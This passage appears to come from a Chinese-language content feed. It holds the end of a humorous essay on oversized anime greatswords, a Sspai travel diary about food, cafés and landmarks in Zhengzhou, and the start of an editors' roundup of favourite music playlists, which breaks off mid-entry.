alt=\"\"><figcaption>单身久了看把剑都......</figcaption></figure><p>但无论是哪种都坚持了长刃刀剑最基础的几点：剑刃细长，重量也没有特别重，也一样都破不了甲......</p>\n<p><strong>然而这是动漫和游戏里的：</strong></p>\n<p><strong>Level 1</strong>（说的就是你猎魔战记）</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-adc0d8a58acaa3501f95bc7a5ee220b6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>其实我也忘了这是谁...</figcaption></figure><p>其实这在动漫作品里已经算小的了，然而这大铁坨子起码也有二三十公斤重——最强壮的人类勇士也许能挥起来砍一刀？重归重，可是长度上我却感觉连现实中的 Claymore 都不如，做成这么重还舍弃了长度优势是为什么？</p>\n<p>然而我们身材纤细，再瘦一点就可以瘦成鲁鲁修（误）的女主可不管这些，随随便便就是一个单手平握（随随便便哑铃侧平举三四十公斤的水平？）</p>\n<p>顺便吐槽下护手，护手边缘就比剑刃宽了一点点，确定这护手不是装饰品？</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7cf79cff4c52cc66771b6e54e45ec26d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>女主</figcaption></figure><p><strong>Level 2</strong>（没错就是你巴隆！）</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-cd52aaad049b03be7de34f087fd93b12_720w.jpg?source=8673f162\" alt=\"\"></figure><p>向门板剑前进了一小步——四五十公斤应该是有了，当然无论如何，应该还是有人类能抬起来砍一刀下去的（然后被对面拿小匕首反杀）</p>\n<p>另外我非常不明白的一点就是，为什么有些日漫里的大剑不做长一点，非要做成这样短粗胖的类型呢？这样搞别提打现实中的巨剑了，我怀疑一米二的 rapier 都能给你戳死......</p>\n<p>顺便提一嘴，这把剑直接连护手都不要了——不过假如真的有人和他粘剑，他的手也不会有事，因为胳膊直接就掉下来了......</p>\n<p>同属这一级别的还有夜刀神十香等等（护手好评）</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-716cb4b52f07f00ac3b74ffd5398d808_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Level 3（</strong>格斯的大剑）</p>\n<p>假如 Level 2 只是到门板剑的过渡期，格斯的大剑可真就是门板剑了，而且还是最正宗的那种。话不多说先上图</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-9ce4f6fe4ad9596aa50076c5ff338f4a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>真的很 man， 属实羡慕了</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-d030ba74a62c70f5db48f98b2757b146_720w.jpg?source=8673f162\" alt=\"\"><figcaption>再来张狂战盔甲的，感受下门板的厚度</figcaption></figure><p>帅归帅，man 归 man，这把剑少说也有三四百公斤重，除了极少数几个大力士怕是没人能让这玩意离开地面，更别提挥舞自如了吧......</p>\n<p>一样的没有护手的设计，我怀疑这种设计就是剑风起的头 hhh，但不得不说，这设计看久了其实还挺帅的。</p>\n<p>同属 Level3 级的还有我们的克劳德同学（比起格斯的门板剑还是小巫见大巫了）</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-cd083e39121abd8a53449a80647b2ae2_720w.jpg?source=8673f162\" alt=\"\"><figcaption>个人认为克劳德最 cool 的一张图</figcaption></figure><p>总之，动漫或者游戏这些作品里我几乎就没见过正常的大剑。<strong>然而和比基尼铠甲，被刀剑吊打的长枪，射人像挠痒痒的弓弩一样，绝大多数时候我我们看动漫玩游戏不就是图个乐子吗？人家也没说自己有多“硬核”，他爱扯就扯呗，高达没有坦克实用我们看高达不是一样津津有味吗？比基尼铠甲和超重型板甲没有板甲衣实用我们不是一样看的爽到爆吗？只要大家心里有数，明白现实中是什么样，动漫和游戏里爱咋地咋地，他赤手空拳吊打耍大枪的我也不反对。</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/340122227\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737829"},{"title":"快乐飞旅行报告 07：郑州的胡辣汤辣口不辣心","date":"2021-07-06 09:07:10","description":"\n<p>在 2020 年底，南航推出了快乐飞 2.0，我终于下定决心开启周末全国飞的计划。上半年假期多，南航快乐飞不局限在周末，买它准没错。万万没想到的是疫情再次来袭，一直拖到了今年 3 月底，我才正式出行，好歹也算抓住了快乐飞的下半程。</p>\n<p>本篇是我的快乐飞旅行游记的第七篇，我会以一个系列的形式向大家分享我这三个月的快乐飞旅行见闻，希望大家喜欢。（到最后，如果南航继续推出快乐飞 3.0，我再来做个快乐飞购买总结。）</p>\n<hr>\n<p>在郑州 Hi Five 咖啡馆里，咖啡师听说我是来郑州旅游，露出难以置信的表情。</p>\n<p>郑州，算不上是一个旅游城市，尽管历史悠久，不过这些历史记忆大都远至夏商代，近点历史文明比不上开封、洛阳更为人所知晓。这次郑州两日游，时间是 5 月 15 日 - 5 月 16 日，是和 <a href=\"https://sspai.com/u/safari_cheung/updates\">@Alan</a> 的摩托之旅。Alan 骑着他的 9 号电动摩托带我在郑州街头巷尾到处转悠打卡，两天竟然风驰电掣般地骑了一百多公里。本来这次旅行，和同是快乐飞的网友相约，不料临到出发前三日，竟被对方鸽了。幸而在微博上偶遇在郑州生活学习的 Alan，成就了这次旅行，在此对 Alan 的陪伴深表感谢 ❤️。</p>\n<h2>方中山胡辣汤：辣口不辣心</h2>\n<p>胡辣汤，中原美食。但在杭州我也吃过，可能是因为宋朝从开封迁都至临安，江浙一带也有胡辣汤，不过与河南的胡辣汤味道、色相都差别很大。</p>\n<p>在郑州，最出名的是「方中山胡辣汤」，总店开在顺和路上，临近 2 号线紫荆山站。很难不把杭州和郑州作番对比，后来听同事说杭州有「小郑州」的说法，不知真假。不过我看紫荆山站简直可以与凤起路站相比，都处于市中心，是1、2号线交汇。</p>\n<p>出了地铁口，老远就闻到香味了。街区正在翻新改造，往向香味飘来的方向只见绿色工地围栏遮挡，走到路口，才见「方中山胡辣汤」的店面。临街店铺分成不同档口，制作胡辣汤、牛肉盒、小煎包等，区域划分井然有序。要先在门外收银台点餐，凭小票取餐后入店内落座食用。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/27/8eb7168bb3a1bb975272129537db2b48.jpg\"></figure><p>滋补胡辣汤，用胡椒、辣椒、牛肉、豆干、木耳、中草药等熬煮，汤汁浓稠、色泽黄褐。口味偏咸，其味极辣，加上刚现盛现吃，真是又烫又辣。不过胡椒的辣，不像尖椒、灯笼椒那般，胡椒是辣口不辣心，过了喉咙辣味就没影了。精品两掺胡辣汤，是在半碗胡辣汤里加了半碗豆腐脑，咸辣味都稀释很多。</p>\n<p>胡辣汤常以包子油条等面点搭配食用，「方中山胡辣汤」供应的特色早点是牛肉盒、葱花油饼、水煎包等。牛肉盒，是韭菜盒子的做法，内陷是粉丝牛肉，外皮油香酥脆。葱花油饼，泡进胡辣汤里，是泡馍的吃法，油饼的干燥用汤汁的浓稠来调解，汤的香辣叠加葱饼的香，口感丰富。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/27/c2a9a88100082c5746e983bb62fae5ea.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/27/88b40a997bf2e85bb01d9003e0428796.jpg\" alt=\"\"></figure><p>店内客人络绎不绝，游客、居民纷至沓来，从我们落座到离开都是座无虚席。Alan 自称「郑州台南人」，说尽管自己是河南人，在郑州待了好几年，但是竟然很少吃胡辣汤，「方中山胡辣汤」竟是从没吃过。吃辣的本事竟也不佳，吃起两掺胡辣汤也呼哧呼哧。接下来两天，Alan 被我带着去了很多从未去过的地方，坐实了「郑州台南人」的自嘲。</p>\n<h2>AKIMBO Lab：网红露台咖啡馆</h2>\n<p>咖啡品牌 AKIMBO Lab，在郑州也开了一家。和潮牌合作、打造第三空间、发展周边产品、ins 风格装修，AKIMBO Lab 现在也是网红打卡好去处。郑州的 AKIMBO Lab 开在金水路上，民航国际酒店三楼半，因此店名也特意加上了 3½。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/27/38a00825998b2d3b60a7a88950a40d12.jpg\"></figure><p>店面一半露天、一半室内。咖啡品质还可但定价极高，都贵在装修了。椰香冰咖，椰汁和美式咖啡的叠加，不过品质不佳，椰青的涩叠加咖啡的涩感，口感不讨喜，因此底下铺了一层洁白椰奶冻，不过甜味较重。店内外不乏靓仔美女拍照，若是看中店内外环境，在此休憩办公洽谈也未为不可。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/27/088f4e4048323b46fd054de35e69cabf.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/27/06ede4f8e80918aec49bad4aa2304b36.jpg\" alt=\"\"></figure><h2>河南博物院：有表有里</h2>\n<p>我们在河南博物院待了两个多小时，对我来说这个博物院确实不错。</p>\n<p>河南博物院装修了整整五年，在去年 9 月底正式开放。Alan 说他年少时侯来过，翻修之后倒是从没踏入。博物院一共有 14 个展馆，按照年代顺序，从新石器时代时代开始，到明清时代结束。9 件镇馆之宝，可以依次找寻打卡。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/27/d98dead0a05bd6a36650f2b70bc8eace.jpg\"></figure><p>先说说馆内的文创商店，品类丰富，虽不比故宫文创名声在外，但我觉得已经非常有文创意识了。围绕 9 件镇馆之宝设计了很多周边产品，徽章、书签、冰箱贴、帆布袋、通关文牒、纪念章、明信片等等应有尽有，还有博物院盲盒，可以买回家体验考古挖掘。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/27/b20593a4c7409db44dd87fd44c710d5a.jpg\"></figure><p>镇馆之宝明信片一套 10 张，含有 9 张镇馆之宝+1 张博物馆外景，盖上博物院章和 9 枚镇馆之宝纪念章，让这小小的卡片瞬间高级许多。真是纪念章星人最爱。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/27/5e14fa54b01c2c4125b8a6566db8263f.jpg\"></figure><p>9 件镇馆之宝从 8000 年前的贾湖骨笛开始，到夏商的杜岭二号方鼎、妇好鸮尊，再到唐武则天自创字金简，直到明清官窑颈瓶，分散在 14 个展馆，可依次参观。还有没上榜的金缕玉衣、唐宫仕女俑像、登封元代观星台等等文物，都值得一探究竟。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/27/de2fb12bf2edeac364e1f68991c5d033.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/27/3bf592329950c979e487028dedf58c92.jpg\" alt=\"\"></figure><h2>光合作用：小确幸咖啡店</h2>\n<p>逛完博物院，找了附近的中国邮政寄走了明信片，我们就去小酌一杯（咖啡）。Alan 骑着摩托车又风驰电掣地在路上奔驰。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/27/e18b8ca8f7fa40375c4b020a62cf9e0f.jpg\"></figure><p>光合作用咖啡店，开在巷子里边、院子底下。治愈系的黄蓝绿配色，到处都是「长乐」、「来福」、「吉」、「好运」等等吉利话，是一家看了就觉得小确幸的咖啡店。</p>\n<p>室内桌椅、室外庭院，可惜当日庭院外有活动，不能落座，客人也多，只能在室内休息。手冲——花魁，花香果香明显，令人十分愉悦。吧台和客区有点距离，没能和咖啡师聊一聊，现在想来实为遗憾。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/27/cb356a3bb2a51e8dccac5c49fec94e56.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/27/ec097a6472c05a879dc83526bcda5424.jpg\" alt=\"\"></figure><p>大多数时间都花在了拍摄 Alan 的电动摩托上了。Alan 电摩上了绿牌，也拿了摩托车驾驶证，在城市里穿梭又快又方便。我已经好多年没有坐过摩托车，都快被种草了，回头一查：杭州禁摩。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/27/2b24d0f0704a831f45f31ce17bcf1c2f.jpg\"></figure><h2>有间餐吧：居民楼下的苍蝇馆子</h2>\n<p>在咖啡店待到了傍晚，我们又出发觅食，前往「有间餐吧」。出发还是好天气，快到店时没想到淅淅沥沥地下起了小雨。这是开在居民楼下的苍蝇馆子，门口台阶下正坐着附近的一家拖儿带小的住户，点了炒馍就在门口吃了起来。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/27/2478211bad1d9f61385dd5f5a90e1ff9.jpg\"></figure><p>我俩点了招牌的几样食物。酸辣面，酸度适中很开胃，辣味则后劲十足，香菇、鸡肉很嫩，新鲜香菜在口腔里散发香味。原只听过酸辣粉，酸辣面倒是头回听说，不过这面条口感差了些。炒馍，是较为蓬松的发酵面团，切成丁，在热油翻炒。吃起来像炸鸡蛋面包丁，撒上烧烤粉料，非常好吃，一口一口不停。再有一大碗红豆粥，煮到了沙质初现但颗粒仍饱满的程度，粥里加了淀粉勾芡，因此有珍珠粉似的粘稠口感，甜蜜顺滑。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/27/c44470634f2a7aac910be08f94ff2485.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/27/a7671ae48c238923315542871a07068e.jpg\" alt=\"\"></figure><p>我们也像附近居民那样，在店外矮方桌上吃了起来。不料没多久，便雨势渐大，只能挪回屋内。到了夜里，雨也没有停止的迹象，拍摄二七塔夜景的计划只能作罢。第一天的行程就这样结束了。</p>\n<h2>地标建筑：二七纪念塔</h2>\n<p>Alan 是深夜工作者，到了第二天中午才起来，所以周日早上我都是自己在找地方消磨时间</p>\n<p>每次来到北方，都会经历糟糕天气，郑州竟然也如此。刮风降温竟到了 15℃，难以置信这是 5 月中旬的气温，不过空气倒还挺好。</p>\n<p>二七纪念塔，算是郑州少有的地标性建筑，建于 1971 年，是为纪念发生于 1923 年 2 月 7 日的二七大罢工而修建的。建筑为双塔结构，顶楼六面大钟整点报时，最高处一颗红色五角星指向天空。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/27/5f5ddbdb2f2de1a38c16797c2447d0dd.jpg\"></figure><p>二七纪念塔不高，郑州（过去）也没有限制附近建筑的高度，因此毗邻二七塔的其他楼房都比它高出不少。想要拍摄近景只能仰拍，在附近的东大康路与人民路交汇的天桥，是少有的可以拍摄二七塔全貌的机位。据说八十年代前，还可登上二七塔，在晴朗的日子里远眺黄河，现在当然无法一睹此景。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/27/fcca289525a4d57ec4b359cc8013b00d.jpg\"></figure><p>人民路，从郑州二七纪念塔一直到紫荆山，是最市中心的道路，从名字就知道见证了这座城市的历史变迁。六车道宽阔马路，两侧梧桐开道，粗壮的梧桐得要两人环抱，想来到了秋天必定分外美丽。现在是 5 月中旬，梧桐正枝繁叶茂、努力生长，枝杈张扬地四散开来。</p>\n<p>走到金水河，从人民路下穿流而过，在这儿的路桥上，护栏将六车道一分为二，人行道上黄色禁停标志可供行人穿梭时短暂停留。紧张地望向人民路，就能欣赏到梧桐大道下车流穿梭的城市风光。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/27/c577ab56112502dfe5d8dbdb0653cc19.jpg\"></figure><h2>Hi Five 咖啡馆：去了两次</h2>\n<p>天色突然阴沉下来，东北风也刮了起来，身着单薄的我，实在坚持不住，找了附近的咖啡店避避寒。开在人民路小三角公园的小巷里，闹中取静，开了家 Hi Five 咖啡馆。暖色灯光，日式小店，店内绿植甚多，橱窗吧台外便是梧桐小公园，到了中午时分，不乏年轻姑娘前来拍照打卡。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/27/027eaf73699ed3b430096e585b513765.jpg\"></figure><p>现在刚营业，我在等 Alan 到了。点了 Dirty 浓郁香甜，选了荔枝风味，是用冰博克牛奶泡荔枝乌龙因此有了荔枝风味。在 Alan 到来且吃完午饭后，我们还再度光临 Hi Five。喝了香草拼配拿铁，带有很明显的香草味，我还以为也是像荔枝风味一样是由后期加入的。结果不是，香草味来自咖啡豆，这是用洪都拉斯咖啡豆经过雪莉酒桶发酵处理，天然带有香草奶油口感，甚是奇妙。</p>\n<p>我在这儿呆坐 Alan 到来的期间，一直与咖啡师聊天，正是他听说我是来郑州旅行，露出了难以置信的神情。郑州能给游客驻足停留的地方确实不多，不过相较于其他城市，郑州的基建、城市发展、市民形象，还是给了我很好的印象。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/27/a2c07f69a9e6f5af64bae9e05efe0c9c.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/27/86defba23c4d159dcf1320bbae119da8.jpg\" alt=\"\"></figure><h2>合记烩面：中</h2>\n<p>午餐就是人民路上的合记烩面总店。</p>\n<p>12 点到店，人满为患，座无虚席。我们选择拼桌，中午时分，拼桌的郑州老哥已经喝上了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/27/361dfa2be42b4cf39d44931f1238a9bd.jpg\"></figure><p>什么是烩面？<a href=\"https://weibo.com/6190030326/KfBWTuaXW\">@盗月社食遇记</a> 刚好发了一期河南碳水食物的 vlog 讲到了河南烩面，说起烩是「开会」的意思，就是把几种已经处理好的食材，与面条同煮，不知真假。</p>\n<p>合记的烩面是羊杂汤面。「滋补老汤烩面」，上桌便是浓郁的香油香气，搅拌均匀，内有粉丝、木耳、羊杂、牛鞭，但以羊腱子肉、羊腿肉居多。面条有嚼劲、不软榻，可以与刀削面相比，不过烩面是手撕面，因此一侧稀薄另一侧厚实，双重口感。羊骨汤新鲜可口，配上糖蒜，在降温的郑州，暖心暖身。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/27/cb24883585d02a556172c04be6b21763.jpg\"></figure><p>拼桌的老哥礼貌热心，一边向我们讲起合记，一边说起自己小时候。原来这合记还是国营集体企业，在离店时，我特意观察门口的迎宾小姐确实都戴了党徽。虽说是清真店，倒也卖起了酒。老哥说起自己是老郑州，二七塔就是童年时期的游乐场，对那长在二七塔旁的两棵树还记忆犹新，常上下打闹。</p>\n<p>原来在二七塔两角上种了两棵树，左边一棵是油松树，右边一棵是古柏树，象征了烈士精神万古长青。后来在 Alan 的摩托经过二七塔时，我特意望向那两棵树，已是郁郁葱葱，快有三四层楼那般高了。</p>\n<h2>连心里：网红小巷</h2>\n<p>一条小巷，仅凭名字就成了网红打卡点。说的是「连心里」，听名字就恩爱非常。在上海虹口区也有一条类似的路，叫做「甜爱路」，不过那条路上开了甜爱咖啡，有一面用各国语言写出「我爱你」的文字墙等等景观，有表有里。「连心里」就只有红墙灰瓦，倒也不乏三三两两年轻情侣前来路牌下拍照打卡。道路尽头就是区民政局，不知凑巧还是故意，着实有趣。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/27/49bd4ae6ef481aba32730d112892f277.jpg\"></figure><p>后来去了「千玺广场」和「中原福塔」，才发现「连心里」还算好的，这两处连前来打卡的游客都没有。这两处建筑和二七塔一起，可以称得上是郑州三大地标建筑，这趟来郑州打卡齐活了。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/06/27/2b58bf34f6effd69c1f793641eda2e93.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/06/27/c93a7fde2c8d1f6b064c14fc4fcb64f0.jpg\" alt=\"\"></figure><h2>小结</h2>\n<p>快离开郑州时突然天气晴朗，阳光洒下，蓝天白云，在机场高速上享受了好天气。郑州的旅行比预想中的要快乐，一来是城市发展水平较高，旅行体验不赖；二来是 Alan 全程摩托带我骑行，两天竟然在郑州来来回回行驶了 100 多公里，把所有收藏的打卡点顺利逛了个遍，再次感谢。</p>\n<p>隐藏玩法：从杭州萧山机场出发，可以在国内出发9号门附近的中国邮政盖到邮戳以及两枚萧山机场纪念章。郑州新郑机场没有设立中国邮政，可以在河南博物院附近的中国邮政盖上邮戳，当然在博物院内九大镇馆之宝的纪念章中挑几枚盖上，也能让集戳页满满当当。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/27/4147f78cada7b5164520c7819b71e35c.jpg\"></figure><p>出行费用：本次郑州两日游共计花费 799.52 元。</p>\n<hr>\n<ul>\n<li><a href=\"https://sspai.com/post/66203\" target=\"_blank\">快乐飞旅行报告 01：广州的早茶可以从早喝到晚</a></li>\n<li><a href=\"https://sspai.com/post/66285\" target=\"_blank\">快乐飞旅行报告 02：除了武汉特色小吃，还有惬意的土耳其咖啡店</a></li>\n<li><a href=\"https://sspai.com/post/66445\" target=\"_blank\">快乐飞旅行报告 03：故宫的花开了</a></li>\n<li><a href=\"https://sspai.com/post/66183\" target=\"_blank\">快乐飞旅行报告 04：我低估了沈阳人民对于「小份」的定义</a></li>\n<li><a href=\"https://sspai.com/post/66510\" target=\"_blank\">快乐飞旅行报告 05：两天的贵阳都是吃</a></li>\n<li><a href=\"https://sspai.com/post/66745\" target=\"_blank\">快乐飞旅行报告 06：自驾在海南最美公路</a></li>\n</ul>\n","link":"https://sspai.com/post/67443"},{"title":"一派：我在_____时会听_____","date":"2021-07-06 08:00:00","description":"\n<p>不管是工作、学习还是冥想、睡觉，根据场景选择合适的音乐、做一个自带 BGM 的人，或许能够帮助我们快速进入状态。</p>\n<p>大家在什么状态下会听什么歌，是 Matrix 机器人一直都很好奇的问题。这次我们就找来了编辑部的小伙伴来做一期简单分享。</p>\n<h2>@Lincoln：关上房门以后会听的 In My Room 歌单</h2>\n<ul>\n<li>平台：Apple Music</li>\n<li>歌单类型：平台推荐</li>\n</ul> <p>那天刚好我忙大作业到深夜，打算听点音乐就睡了。当我点开 Apple Music 的 For You，就被 In My Room 的封面所吸引，这也是我第一次点开它。</p>\n<p>这个歌单主要由慢摇流行乐组成，它们最主要的特点就是编曲节拍松散而较慢、使用温和的复古电子合成器，而这样设计的音乐确实能够引起清冷、缓慢的氛围；加上对声音适当的「分层」设计，可以更让听众更沉浸其中。第一次听的时候，我就逐渐把自己的思绪沉浸在音乐中，甚至连何时睡着的都不知道。</p>\n<p>自此以后，In My Room 逐渐成为常听的歌单之一。而后来随着学习、工作压力慢慢变大，有了整理思绪的习惯，意外发现 In My Room 也非常适合在整理思绪的时候听。首先是虽然节拍不弱，但是相对松散且缓慢，营造的一个清冷、缓慢的氛围，让我更容易沉浸在自己的思绪里，而不是随着音乐一起「摇摆」。其次，人声没有做特别花哨的效果器，搭配上之前的氛围，使得歌曲带来了极强的倾诉感，同样激发了我的倾诉欲。最后，正如歌单列表自己的描述一样：</p>\n<blockquote><p>找一点属于自己的时间没有错。关上房门，找一个舒适的角落，把思绪沉浸在这些慢摇流行乐曲里。</p></blockquote>\n<p>我相信无论是谁都需要给自己留一点时间。</p>\n<p>我相信它是适合大部分人环境歌单。</p>\n<h2>@Lotta：洗碗的时候会听的 Alex Rider 歌单</h2>\n<ul>\n<li>平台：Spotify</li>\n<li>歌单类型：用户整理</li>\n</ul> <p>收录英剧《少年间谍 Alex Ride》中的插曲，比如大家熟悉的乐队 Muse 和 Cage the Elephant，音乐类型和风格包括 Punk、独立摇滚、前卫摇滚、电子、EDM 等等，既适合在 deadline 前疯狂赶工、在家蹦迪锻炼身体，也适合洗碗、拖地等家务劳动，把无聊的事情变嗨。</p>\n<p>印象最深刻的就是第 1 集里，中学生主角 Alex 放学后飞檐走壁进老师办公室撬锁，帮好朋友偷被没收手机时候的《Burning Down - Everyone You Know》，带动情绪又燃又紧张，替屏幕外的观众实现了学生时代的梦想（bushi）；还有第 4 集里 Alex 在特殊学校卧底洗碗时候的《Gates of Dawn - Spektre》，把洗洁精都倒进水池，造了满屋子的泡泡，三个人边舞泡泡边蹦迪。就像看过《壁花少年》之后，每次过隧道都在脑内自动循环大卫·鲍伊的《Heroes》，现在每次洗碗的时候也都要听 Spektre 这首《Gates of Dawn》！</p>\n<p>片中主角 Alex 去世的父亲和叔叔都是特工，Alex 自己也被训练了一身本领，不仅能飞檐走壁、溜门撬锁，甚至第一次跟踪军情六处的人就得手了（为了调查叔叔的死因），还打翻了一个成年特工，引得他们领导官方吐槽，并被收编去特殊学校当卧底，还有惊心动魄的审讯、枪战、高山滑雪逃命等情节，改编自同名的「少年 007」系列畅销书，第二季今年也在拍啦，期待！</p>\n<p>编辑部在做事的时候都假装自己是个正在蹦迪的酷帅特工🕶（bushi</p>\n<h2>@北鸮：只要出门，我的耳朵里就是每周新发现</h2>\n<ul>\n<li>平台：Spotify</li>\n<li>歌单类型：平台生成</li>\n</ul>\n<p>在用 Spotify 之前，我其实常常犯愁要从哪里淘新歌。每天出门遛弯时都要听歌的我，原本已经受够了推荐歌单的苦。虾米倒了之后，我的快乐分散到了各个平台。但是 QQ 音乐和网易云的每日推荐常常从第一首开始就带给我最纯粹的颅内打击——不知道是算法不行，还是我不太行以至于让算法误会了什么，推荐 30 首就能有 30 首魂归垃圾桶，精准猜中你不喜欢这些音乐。所以我只能一遍又一遍听我点过喜欢的歌曲，听到自己全文背诵，说实话挺烦的。直到我迁移到了 Spotify。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/article/2ca5c309ccb6fba94d23c26813b1e46e\"></figure><p>Spotify 的推荐算不上首首精准，但比起之前的垃圾桶合集已经是可以拿到金奖的程度了。歌单中偶尔也会出现一些奇怪的选手，比如最近，我在路上就听到了泰语说唱和阿拉伯语 R&amp;B，虽然我听不懂，可它们每一首都很好听，很少出现我生气到特意点进 App 按不喜欢的情况。</p>\n<p>除此之外，这种自动生成的列表还让我面对音乐的心态平和了许多，比如我可以听到一些我绝对不会点进去的流量艺人的音乐，因为混杂在一众不同语言的歌曲之间，我又不熟悉他们的声音，就可以只从歌曲的角度去判断好坏，到现在也有了几首意外发现，一首实打实的作品就把我对他/她的刻板印象扳回了不少（虽然有不少还是……很一般）。</p>\n<p>感谢 Spotify 让我不再每天坐拥垃圾桶。现在我已经没有专门点开「我收藏的音乐」只听自己喜欢的歌的习惯了。唯一可惜的就是每周新发现真的是一周才更新一次。好在听完之后，我还有六个风格迥异的 Daily Mix 可以选择，里面也有一些新歌能搜罗。</p>\n<h2>@Tp：打开 Apple Music 就会听的「万金油」歌单</h2>\n<ul>\n<li>平台：Apple Music</li>\n<li>歌单类型：平台推荐 + 自行整理</li>\n</ul> <p>我是一个听歌比较随意的人，偶然间听到喜欢的歌便会把它收藏到歌单里。除了自己百听不厌的那些歌曲外，我的歌单里也有不少 Apple Music 推荐里那些令我惊艳的歌曲。我不太会刻意去给音乐做分类，因此我的歌单会显得比较「杂」，也比较个人化。每当我打开 Apple Music，我基本都会直接在歌单里随机播放，省去了不少筛选的麻烦。</p>\n<p>我的歌单里有不少与苏打绿 / 鱼丁糸主唱吴青峰相关的音乐。其中既有他自己创作、演唱的，也有曾在他的 Apple Music 推荐歌单里出现过的音乐。或许是出于多年以来对他音乐风格的喜爱，他推荐的音乐往往也很能抓住我的耳朵。其中不少音乐都跟苏打绿的歌一样，乍听上去并不「抓耳」，但越听越觉得好听。</p>\n<p>我平常很少听 rap，不过我还是想单独说说歌单里《My Man》和《28》这两首 rap，它们所表达的是对父母的爱以及对自我的迷茫。我不常听 rap 的其中一个原因在于，我非常认同周杰伦在 <a href=\"https://www.bilibili.com/video/av18035321\" target=\"_blank\">CNN 采访</a> 中说的「美国的嘻哈乐大都是关于毒品、枪支和暴力，但是我的正相反。我有些歌听上去很暴力，但其实都是充满爱的，不要吸毒，要去关心你的父母。」rap 完全可以用「暴力」的听感来表达正面的事情，而绝非通篇描述毒品、性的快感，然后美其名曰「让你看到血淋淋的现实」。当然，这只是个人喜好问题，如果你跟我一样曾经对 rap 有过排斥心理，不妨试试这两首歌，也许它们能让你对 rap 有不同的看法。</p>\n<h2>@张奕源 Nick</h2>\n<h3>伴我思绪专注的 Bach 与 Glenn Gould</h3>\n<ul>\n<li>平台：所有主流音乐流媒体平台</li>\n<li>歌单类型：平台生成或专辑</li>\n<li>推荐链接：<a href=\"https://music.apple.com/us/album/bach-goldberg-variations-bwv-988-the-1955-1981-recordings/594521223\" target=\"_blank\"><i>Bach: Goldberg Variations, BWV 988 (The 1955 &amp; 1981 Recordings)</i></a>\n</li>\n</ul>\n<p>我因为小时候在家偶尔听两耳朵 Classical，所以对这个音乐类型产生潜意识的好感与亲切。成长的过程中，Classical 一直与我若即若离地相伴。到了工作中，当我需要保持专注并连续工作的时候，Classical 就成了我的专享背景乐。</p>\n<p>在众多作曲家中，我更喜欢 Bach 的作品，他的音乐简单、直白，许多作品都带有指导性，却又暗藏着规整的数学之美。而且众多 Bach 作品的演奏家中，我也最喜欢怪异且特立独行的 Glenn Gould。</p>\n<p>我常开玩笑说，我的「人生三大佩服」之一就是「能裸耳听出 Classical 音乐版本」。但 Gould 演奏的 Bach 实在太过独特，是我为数不多能分辨演奏家的 Classical 音乐。</p>\n<p>说回音乐本身，Bach 的钢琴作品大多悠扬、沉稳，不打扰工作，还能让我更快进入「心流」状态。我在专注工作中尝试过许多音乐，其中的很多也都不错，但每当我不想做选择时，Gould 的 Bach 都会成为我的默认选项。</p>\n<h3>另类的万能之选：《兒童樂園》</h3>\n<ul>\n<li>平台：Bandcamp</li>\n<li>歌单类型：音乐专辑</li>\n<li>推荐链接：<a href=\"https://baishui.bandcamp.com/album/their-paradise\" target=\"_blank\">《兒童樂園》on 